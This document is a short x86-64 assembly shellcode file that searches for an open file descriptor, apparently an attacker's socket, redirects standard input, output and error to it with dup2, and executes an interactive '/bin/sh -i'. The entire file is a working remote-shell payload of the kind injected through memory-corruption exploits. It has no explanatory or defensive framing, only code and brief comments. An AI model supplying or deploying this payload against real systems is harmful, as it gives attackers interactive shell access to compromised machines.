BITS 64
section .text

	global _start

_start:
	call start
	db "/bin/sh", 0, 0
	db "-i", 0
	align 4

start:
	mov rdi, 2 		; let's start with fd 3, because 0 - 2 are usualy used for stdio

	xor rax, rax
	inc rax			; set rax to a non-zero value (we need that for the condition at check_fd_loop_end)

	jmp check_fd_loop_end

check_fd_loop_start:
	inc rdi
	mov r9, rdi

	mov rax, 72		; call fcntl
	mov rsi, 1		; use flag F_GETFD // This does detect if the fd is valid, i need to find something to be sure it's our socket
	syscall

	mov rdi, r9

check_fd_loop_end:
	cmp rax, 0		; if fcntl() returned 0, we get a valid fd
	jne check_fd_loop_start

;;; Let's dup2() to bind filedescriptors to the socket

	mov rsi, 3
dup_loop:
	mov rax, 33
	dec rsi
	syscall
	test rsi, rsi
	jnz dup_loop

;;; We can now exec our shell
shell:
	mov rdi, [rsp]		  ; pointer to the first string "/bin/sh", 0
	lea rax, [rdi + 9]
	mov [rsp + 8], rax
	lea rsi, [rsp]		  ; pointer to begining of the tab
	mov qword [rsp + 0x10], 0
	mov rdx, 0
	mov rax, 59
	syscall
